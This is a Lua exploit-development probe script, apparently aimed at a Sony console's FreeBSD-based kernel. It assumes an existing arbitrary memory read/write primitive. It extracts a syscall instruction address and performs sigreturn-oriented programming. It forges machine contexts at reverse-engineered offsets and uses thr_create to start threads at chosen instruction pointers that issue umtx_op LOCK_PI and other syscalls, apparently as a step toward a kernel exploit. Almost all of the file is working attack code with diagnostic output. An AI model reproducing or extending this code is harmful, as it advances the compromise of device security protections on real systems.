-- CRASH_CLASS: MODERATE
-- PROBE 142d: thr_create with getcontext + correct MC=0x10 offsets
--
-- 142c PROVED threads execute (binary garbage = thread ran at wrong RIP).
-- The crash was because getcontext fills at SROP MC=0x40, but thr_create
-- reads MC=0x10. Now we fill with getcontext THEN overwrite the thr_create
-- offsets (MC=0x10) with our desired values.
--
-- Sony's thr_create mcontext layout (MC=0x10):
--   Standard FreeBSD GPR offsets (mc_rdi=+0x08, mc_rax=+0x38)
--   Sony removed trap/segment fields between mc_r15(+0x78) and mc_rip(+0x80)
--   Control regs verified: mc_rip=+0x80, mc_cs=+0x88, mc_rflags=+0x90,
--   mc_rsp=+0x98, mc_ss=+0xA0, mc_len=+0x108

print("=== PROBE 142d: CORRECT OFFSET THR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP offsets (MC=0x40) - for the main thread's SROP helper
local S_MC = 0x40
local S_RDI = S_MC + 0x08
local S_RSI = S_MC + 0x10
local S_RDX = S_MC + 0x18
local S_R10 = S_MC + 0x50
local S_R8  = S_MC + 0x28
local S_R9  = S_MC + 0x30
local S_RAX = S_MC + 0x38
local S_RIP = S_MC + 0xA0
local S_CS  = S_MC + 0x98
local S_RSP = S_MC + 0xB8
local S_SS  = S_MC + 0xB0

-- THR_CREATE offsets (MC=0x10) - Sony's modified mcontext
local T_MC = 0x10
local T_RDI = T_MC + 0x08    -- standard FreeBSD GPR offset
local T_RSI = T_MC + 0x10
local T_RDX = T_MC + 0x18
local T_RCX = T_MC + 0x20
local T_R8  = T_MC + 0x28
local T_R9  = T_MC + 0x30
local T_RAX = T_MC + 0x38
local T_RBX = T_MC + 0x40
local T_RBP = T_MC + 0x48
local T_R10 = T_MC + 0x50
local T_RIP = T_MC + 0x80    -- verified
local T_CS  = T_MC + 0x88    -- verified
local T_RFLAGS = T_MC + 0x90 -- verified
local T_RSP = T_MC + 0x98    -- verified
local T_SS  = T_MC + 0xA0    -- verified
local T_LEN = T_MC + 0x108   -- verified

-- Get syscall instruction address via SROP getcontext
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = rq(srop_ctx + S_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

-- SROP helper (main thread only)
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + S_RIP, sc_addr)
    wq(srop_ctx + S_RAX, uint64(num))
    if a1 then wq(srop_ctx + S_RDI, a1) end
    if a2 then wq(srop_ctx + S_RSI, a2) end
    if a3 then wq(srop_ctx + S_RDX, a3) end
    if a4 then wq(srop_ctx + S_R10, a4) end
    if a5 then wq(srop_ctx + S_R8, a5) end
    if a6 then wq(srop_ctx + S_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Main TID
local tid_buf = gpu + 0x100
wq(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local main_tid = safe_rq(tid_buf)
print("main_TID=" .. hex(main_tid))

-- sleep helper
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))  -- 500ms
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

-- Verify main LOCK_PI
local test_f = gpu + 0x200
wd(test_f, 0)
local rv_t = srop(454, ua(test_f), uint64(12), uint64(0), uint64(0), uint64(0))
print("main_LOCK_PI: ret=" .. hex(rv_t) .. " futex=0x" .. string.format("%X", safe_rd(test_f) or 0))

--------------------------------------------------------------------
-- [A] getcontext + thr_create offsets: LOCK_PI from child thread
--------------------------------------------------------------------
print("")
print("--- [A] getctx + THR offsets: LOCK_PI ---")

local futex_a = gpu + 0x1000
wd(futex_a, 0)
local stack_a = gpu + 0x10000
for off = 0, 0x1FFF, 4 do wd(stack_a + off, 0) end

-- Build context: start from getcontext, then overwrite at THR offsets
local ctx_a = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_a + off, 0) end
-- Fill with getcontext for metadata (FP state, signal mask, etc.)
pcall(function() return sc_gc(uint64(ctx_a)) end)

-- Now overwrite at THR_CREATE offsets
wq(ctx_a + T_RIP, sc_addr)               -- syscall instruction
wq(ctx_a + T_RAX, uint64(454))            -- umtx_op
wq(ctx_a + T_RDI, ua(futex_a))            -- futex addr
wq(ctx_a + T_RSI, uint64(12))             -- LOCK_PI
wq(ctx_a + T_RDX, uint64(0))
wq(ctx_a + T_R10, uint64(0))
wq(ctx_a + T_R8, uint64(0))
wq(ctx_a + T_RSP, ua(stack_a + 0x1800))   -- thread stack
wq(ctx_a + T_CS, uint64(0x43))
wq(ctx_a + T_SS, uint64(0x3B))
wq(ctx_a + T_RFLAGS, uint64(0x202))
wq(ctx_a + T_LEN, uint64(0x480))

-- Also make sure the SROP-position mc_rip is harmless
-- (getcontext stored the real RIP there; if thr_create reads ANY
-- field from SROP positions too, this avoids confusion)

local tid_a = gpu + 0x30000
wq(tid_a, uint64(0xDEADDEAD))

print("[A] pre-futex=0x" .. string.format("%X", safe_rd(futex_a) or 0))
print("[A] Creating thread...")
local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(ctx_a), uint64(tid_a), uint64(0))
end)
local ntid_a = safe_rq(tid_a)
print("[A] ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) .. " tid=" .. hex(ntid_a))

msleep()
print("[A] alive pid=" .. to_num(sc20()))
local fva = safe_rd(futex_a)
print("[A] futex=0x" .. string.format("%X", fva or 0))
if fva and fva ~= 0 then
    print("[A] *** THREAD EXECUTED LOCK_PI! futex=" .. string.format("0x%X", fva) .. " ***")
end

-- Check if the thread is still alive
local n_a_h, n_a_l = get_hi_lo(ntid_a)
if n_a_l ~= 0 and n_a_l ~= 0xDEADDEAD then
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(n_a_l), uint64(0))
    end)
    print("[A] thr_kill(0)=" .. tostring(rv_k))
end

--------------------------------------------------------------------
-- [B] Same but child calls thr_exit(431) — test if thread runs at all
-- Write a marker to GPU mem BEFORE the syscall using a gadget
--------------------------------------------------------------------
print("")
print("--- [B] THR offsets: write marker + thr_exit ---")

local marker_b = gpu + 0x2000
wd(marker_b, 0x41414141)
local stack_b = gpu + 0x14000
for off = 0, 0x1FFF, 4 do wd(stack_b + off, 0) end

local ctx_b = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)

-- Child does: syscall(write(4), fd=1, buf=marker_addr, len=8)
-- Wait no - write to stdout could work but we can't guarantee fd 1 is connected
-- Instead: have child call thr_exit(0x42) — if thr_kill returns ESRCH after,
-- the thread ran and exited
wq(ctx_b + T_RIP, sc_addr)
wq(ctx_b + T_RAX, uint64(431))   -- thr_exit
wq(ctx_b + T_RDI, uint64(0x42))  -- exit status
wq(ctx_b + T_RSP, ua(stack_b + 0x1800))
wq(ctx_b + T_CS, uint64(0x43))
wq(ctx_b + T_SS, uint64(0x3B))
wq(ctx_b + T_RFLAGS, uint64(0x202))
wq(ctx_b + T_LEN, uint64(0x480))

local tid_b = gpu + 0x30010
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating thread (thr_exit)...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. hex(ntid_b))

msleep()
print("[B] alive pid=" .. to_num(sc20()))

local n_b_h, n_b_l = get_hi_lo(ntid_b)
if n_b_l ~= 0 and n_b_l ~= 0xDEADDEAD then
    -- thr_kill(tid, 0) = check if alive. ret=0 means alive, ret=-1 means ESRCH (dead)
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(n_b_l), uint64(0))
    end)
    print("[B] thr_kill(0)=" .. tostring(rv_k) .. " (0=alive, -1=dead/exited)")

    -- Also try thr_kill with signal 0 via SROP
    local rv_ks = srop(433, uint64(n_b_l), uint64(0))
    print("[B] srop_thr_kill(0)=" .. hex(rv_ks))
end

--------------------------------------------------------------------
-- [C] Child writes marker to GPU memory via mmap write
-- Use sysctl getpid from child — if pid matches, thread executed
--------------------------------------------------------------------
print("")
print("--- [C] THR offsets: child getpid ---")

local pid_out = gpu + 0x3000
wd(pid_out, 0xBBBBBBBB)
local stack_c = gpu + 0x18000
for off = 0, 0x1FFF, 4 do wd(stack_c + off, 0) end

local ctx_c = gpu + 0x30100
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)

-- Child calls write(4, fd, buf, len) to write its PID to stdout
-- Actually: have child call getpid(20), then the return value
-- is in RAX. But we can't read RAX from another thread easily.
-- Better: have child call sys 432 (thr_self) with rdi=pid_out
-- thr_self writes the TID to the pointer in rdi
wq(ctx_c + T_RIP, sc_addr)
wq(ctx_c + T_RAX, uint64(432))    -- thr_self
wq(ctx_c + T_RDI, ua(pid_out))    -- output pointer
wq(ctx_c + T_RSP, ua(stack_c + 0x1800))
wq(ctx_c + T_CS, uint64(0x43))
wq(ctx_c + T_SS, uint64(0x3B))
wq(ctx_c + T_RFLAGS, uint64(0x202))
wq(ctx_c + T_LEN, uint64(0x480))

local tid_c = gpu + 0x30020
wq(tid_c, uint64(0xDEADDEAD))

print("[C] pre_pid_out=0x" .. string.format("%X", safe_rd(pid_out) or 0))
print("[C] Creating thread (thr_self)...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
local ntid_c = safe_rq(tid_c)
print("[C] ok=" .. tostring(ok_c) .. " rv=" .. tostring(rv_c) .. " tid=" .. hex(ntid_c))

msleep()
print("[C] alive pid=" .. to_num(sc20()))
local post_pid = safe_rd(pid_out)
print("[C] pid_out=0x" .. string.format("%X", post_pid or 0))
if post_pid and post_pid ~= 0xBBBBBBBB and post_pid ~= 0 then
    print("[C] *** THREAD WROTE TID! Value=0x" .. string.format("%X", post_pid) .. " ***")
    local n_c_h, n_c_l = get_hi_lo(ntid_c)
    if post_pid == n_c_l then
        print("[C] *** TID MATCHES! Thread execution CONFIRMED! ***")
    else
        print("[C] TID mismatch: wrote=" .. post_pid .. " expected=" .. n_c_l)
    end
end

--------------------------------------------------------------------
-- [D] Child writes dword to GPU via write(4) syscall to verify
-- Actually simpler: child calls mmap to create a mapping
-- Even simpler: child writes to a futex with WAKE operation
--------------------------------------------------------------------
print("")
print("--- [D] THR offsets: child WAKE futex ---")

local futex_d = gpu + 0x4000
wd(futex_d, 0x99)
local stack_d = gpu + 0x1C000
for off = 0, 0x1FFF, 4 do wd(stack_d + off, 0) end

local ctx_d = gpu + 0x38000
for off = 0, 0x4FF, 4 do wd(ctx_d + off, 0) end
pcall(function() return sc_gc(uint64(ctx_d)) end)

-- UMTX_OP_WAKE = 3: wakes up N waiters on a futex
-- Args: (futex_addr, op=3, wake_count=1, 0, 0)
wq(ctx_d + T_RIP, sc_addr)
wq(ctx_d + T_RAX, uint64(454))    -- umtx_op
wq(ctx_d + T_RDI, ua(futex_d))    -- futex addr
wq(ctx_d + T_RSI, uint64(3))      -- UMTX_OP_WAKE
wq(ctx_d + T_RDX, uint64(1))      -- wake 1 waiter
wq(ctx_d + T_R10, uint64(0))
wq(ctx_d + T_R8, uint64(0))
wq(ctx_d + T_RSP, ua(stack_d + 0x1800))
wq(ctx_d + T_CS, uint64(0x43))
wq(ctx_d + T_SS, uint64(0x3B))
wq(ctx_d + T_RFLAGS, uint64(0x202))
wq(ctx_d + T_LEN, uint64(0x480))

local tid_d = gpu + 0x30030
wq(tid_d, uint64(0xDEADDEAD))

print("[D] Creating thread (WAKE futex)...")
local ok_d, rv_d = pcall(function()
    return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
end)
local ntid_d = safe_rq(tid_d)
print("[D] ok=" .. tostring(ok_d) .. " rv=" .. tostring(rv_d) .. " tid=" .. hex(ntid_d))

msleep()
print("[D] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [E] Dump the ACTUAL getcontext layout to confirm offset theory
-- This is the diagnostic that 142c missed (process crashed before)
--------------------------------------------------------------------
print("")
print("--- [E] getcontext layout diagnostic ---")
local dump = gpu + 0x40000
for off = 0, 0x1FF, 4 do wd(dump + off, 0xCC) end  -- fill with pattern
pcall(function() return sc_gc(uint64(dump)) end)

-- Check SROP positions
local e_rip_srop = safe_rq(dump + 0xE0)  -- SROP mc_rip
local e_cs_srop = safe_rq(dump + 0xD8)   -- SROP mc_cs
local e_rsp_srop = safe_rq(dump + 0xF8)  -- SROP mc_rsp

-- Check THR positions
local e_rip_thr = safe_rq(dump + 0x90)   -- THR mc_rip
local e_cs_thr = safe_rq(dump + 0x98)    -- THR mc_cs
local e_rsp_thr = safe_rq(dump + 0xA8)   -- THR mc_rsp

print("[E] SROP mc_rip(+0xE0)=" .. hex(e_rip_srop))
print("[E] SROP mc_cs (+0xD8)=" .. hex(e_cs_srop))
print("[E] SROP mc_rsp(+0xF8)=" .. hex(e_rsp_srop))
print("[E] THR mc_rip (+0x90)=" .. hex(e_rip_thr))
print("[E] THR mc_cs  (+0x98)=" .. hex(e_cs_thr))
print("[E] THR mc_rsp (+0xA8)=" .. hex(e_rsp_thr))

-- Identify which format getcontext uses
-- If SROP mc_cs is 0x43 and THR mc_cs is not → getcontext uses SROP format
-- If THR mc_cs is 0x43 and SROP mc_cs is not → getcontext uses THR format
local e_cs_srop_l = safe_rd(dump + 0xD8)
local e_cs_thr_l = safe_rd(dump + 0x98)
print("[E] CS at SROP pos=0x" .. string.format("%X", e_cs_srop_l or 0))
print("[E] CS at THR pos=0x" .. string.format("%X", e_cs_thr_l or 0))

if e_cs_srop_l == 0x43 then
    print("[E] >>> getcontext uses SROP format (MC=0x40)")
elseif e_cs_thr_l == 0x43 then
    print("[E] >>> getcontext uses THR format (MC=0x10)")
else
    print("[E] >>> NEITHER position has CS=0x43!")
end

-- Full scan for CS=0x43 pattern
print("[E] Scanning for 0x43 in context:")
for off = 0, 0x1FF, 4 do
    local v = safe_rd(dump + off)
    if v == 0x43 then
        print(string.format("[E] +0x%03X = 0x43 (CS candidate!)", off))
    end
end

-- Full scan for RIP-like values (should match sc_addr+2 or similar)
local rip_h, rip_l = get_hi_lo(e_rip_srop)
print("[E] Expected RIP range: " .. string.format("0x%X", rip_h))
print("[E] Scanning for RIP-range values:")
for off = 0, 0x1FF, 8 do
    local v = safe_rq(dump + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh == rip_h and vl ~= 0 then
            print(string.format("[E] +0x%03X = %s (RIP-range!)", off, hex(v)))
        end
    end
end

print("[E] pid=" .. to_num(sc20()))
print("=== DONE ===")
